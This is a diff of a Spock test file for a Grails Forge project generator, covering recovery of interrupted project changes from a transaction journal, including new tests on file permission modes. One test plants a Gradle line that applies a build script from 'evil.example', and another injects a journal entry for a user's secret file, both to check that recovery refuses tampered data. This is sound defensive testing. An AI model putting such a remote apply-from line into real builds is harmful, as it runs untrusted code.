@@ -671,7 +671,7 @@ class FeatureAdditionSpec extends AbstractFeatureAdditionSpec {
 
         when: 'a record of a change that had not begun to write'
         Path of = Files.createDirectories(records.resolve(sha(project.toRealPath().toString().getBytes('UTF-8'))))
-        Files.writeString(of.resolve('journal'), "grails-forge-transaction 3\nproject ${Base64.urlEncoder.withoutPadding().encodeToString(project.toRealPath().toString().getBytes('UTF-8'))}\n" +
+        Files.writeString(of.resolve('journal'), "grails-forge-transaction 4\nproject ${Base64.urlEncoder.withoutPadding().encodeToString(project.toRealPath().toString().getBytes('UTF-8'))}\n" +
                 'id t0123456789abcdef01234567\nstaging\n')
 
         then:
@@ -736,8 +736,8 @@ class FeatureAdditionSpec extends AbstractFeatureAdditionSpec {
         byte[] evil = 'apply from: "https://evil.example/build.gradle"\n'.getBytes('UTF-8')
         [project, inside].each { Path where ->
             Path of = Files.createDirectories(where.resolve('.grails/forge/transactions').resolve(sha(project.toRealPath().toString().getBytes('UTF-8'))))
-            Files.writeString(of.resolve('journal'), "grails-forge-transaction 3\nproject ${path}\nid t0123456789abcdef01234567\n" +
-                    "put 0 ${sha(evil)} ${sha(project.resolve('build.gradle'))} build.gradle\nend\n")
+            Files.writeString(of.resolve('journal'), "grails-forge-transaction 4\nproject ${path}\nid t0123456789abcdef01234567\n" +
+                    "put 0 ${sha(evil)} ${sha(project.resolve('build.gradle'))} rw-r--r-- build.gradle\nend\n")
         }
         Files.createDirectories(project.resolve('.grails/transactions/t0123456789abcdef01234567/backup'))
         Files.write(project.resolve('.grails/transactions/t0123456789abcdef01234567/backup/0'), evil)
@@ -825,6 +825,118 @@ class FeatureAdditionSpec extends AbstractFeatureAdditionSpec {
         recovery.putBack.contains('tool.sh')
         !Files.isExecutable(project.resolve('tool.sh'))
         tree(project) == before
+
+        when: 'the change ends after it made the script executable, and the script is given yet another mode since'
+        try {
+            planOf(generator, project).apply { String path ->
+                if (path == 'tool.sh') {
+                    throw new Stopped()
+                }
+            }
+        } catch (Stopped ignored) {
+        }
+        String given = mode(project.resolve('tool.sh'))
+        String another = given == 'rwx------' ? 'rwxrwx---' : 'rwx------'
+        Files.setPosixFilePermissions(project.resolve('tool.sh'), PosixFilePermissions.fromString(another))
+        Map<String, String> interrupted = tree(project)
+        addition(generator).recover(project)
+
+        then: 'the mode is neither the one the script had nor the one the change gave it: nothing is put back'
+        ProjectChangeException e = thrown()
+        e.message.startsWith("A file of a change that was interrupted has another mode than the change gave it: tool.sh is ${another}, and the change gave it ${given}. " +
+                'Putting it back would undo what was changed since, so nothing was put back.')
+        tree(project) == interrupted
+
+        when: 'the script has the mode the change gave it'
+        Files.setPosixFilePermissions(project.resolve('tool.sh'), PosixFilePermissions.fromString(given))
+        recovery = addition(generator).recover(project)
+
+        then:
+        recovery.undone
+        recovery.putBack.contains('tool.sh')
+        tree(project) == before
+    }
+
+    @IgnoreIf({ os.windows })
+    void "a file the change wrote whose mode was changed after the interruption stops the undoing, and nothing is put back"() {
+        given: 'a change that was interrupted after it had written the configuration, whose mode is then made rw------- with its bytes as the change wrote them'
+        ProjectGenerator generator = generator()
+        Path project = create(generator, 'app', [])
+        Path configuration = project.resolve('grails-app/conf/application.yml')
+        Files.setPosixFilePermissions(configuration, PosixFilePermissions.fromString('rw-r--r--'))
+        Map<String, String> before = tree(project)
+        try {
+            planOf(generator, project).apply { String path ->
+                if (path == 'grails-app/conf/application.yml') {
+                    throw new Stopped()
+                }
+            }
+        } catch (Stopped ignored) {
+        }
+        byte[] asWritten = Files.readAllBytes(configuration)
+        Files.setPosixFilePermissions(configuration, PosixFilePermissions.fromString('rw-------'))
+        Map<String, String> interrupted = tree(project)
+        String change = left(project).first()
+
+        when:
+        addition(generator).recover(project)
+
+        then: 'the mode is a change of its own, which putting the file back would undo, as it would undo a change of its bytes'
+        ProjectChangeException e = thrown()
+        e.message.startsWith('A file of a change that was interrupted has another mode than the change gave it: grails-app/conf/application.yml is rw-------, and the ' +
+                'change gave it rw-r--r--. Putting it back would undo what was changed since, so nothing was put back. Give it the mode the change gave it, or make it ' +
+                "what it was before the change (the files that were replaced are kept in .grails/transactions/${change}/backup, with their modes, and a file that " +
+                'was new is to be removed), and run the command again; or restore the project from version control and remove the file journal from the directory ')
+
+        and: 'not one file, and the configuration keeps its bytes and its mode'
+        tree(project) == interrupted
+        Files.readAllBytes(configuration) == asWritten
+        mode(configuration) == 'rw-------'
+
+        when: 'the file has the mode the change gave it'
+        Files.setPosixFilePermissions(configuration, PosixFilePermissions.fromString('rw-r--r--'))
+        ProjectRecovery recovery = addition(generator).recover(project)
+
+        then:
+        recovery.undone
+        recovery.putBack == ['README.md', 'build.gradle', 'grails-app/conf/application.yml']
+        tree(project) == before
+        left(project) == []
+        journals() == []
+    }
+
+    @IgnoreIf({ os.windows })
+    void "a change that had written every file is complete although the mode of one was changed since, and the mode is kept"() {
+        given: 'a change that was interrupted after its last file, and a file of it made rw------- since'
+        ProjectGenerator generator = generator()
+        Path project = create(generator, 'app', [])
+        Path with = create(generator, 'with', [FEATURE])
+        try {
+            planOf(generator, project).apply { String path ->
+                if (path == ProjectState.MANIFEST) {
+                    throw new Stopped()
+                }
+            }
+        } catch (Stopped ignored) {
+        }
+        Files.setPosixFilePermissions(project.resolve('build.gradle'), PosixFilePermissions.fromString('rw-------'))
+
+        when: 'nothing is put back, so nothing is undone of what was changed since'
+        ProjectRecovery recovery = addition(generator).recover(project)
+
+        then:
+        recovery.completed
+        !recovery.undone
+        recovery.putBack == []
+        mode(project.resolve('build.gradle')) == 'rw-------'
+        differing(tree(project), tree(with)) == ['build.gradle']
+        Files.readAllBytes(project.resolve('build.gradle')) == Files.readAllBytes(with.resolve('build.gradle'))
+        left(project) == []
+        journals() == []
+    }
+
+    private static String mode(Path file) {
+        return PosixFilePermissions.toString(Files.getPosixFilePermissions(file))
     }
 
     void "the directories a change made are removed with its journal when its files were removed by other means"() {
@@ -1180,7 +1292,7 @@ class FeatureAdditionSpec extends AbstractFeatureAdditionSpec {
         Map<String, String> interrupted = tree(project)
 
         when: 'a line more, for a file of the user'
-        journal.toFile().text = written.replace('\nend\n', "\nput 99 - ${sha(project.resolve('secret.txt'))} secret.txt\nend\n")
+        journal.toFile().text = written.replace('\nend\n', "\nput 99 - ${sha(project.resolve('secret.txt'))} rw-r--r-- secret.txt\nend\n")
         addition(generator).recover(project)
 
         then:
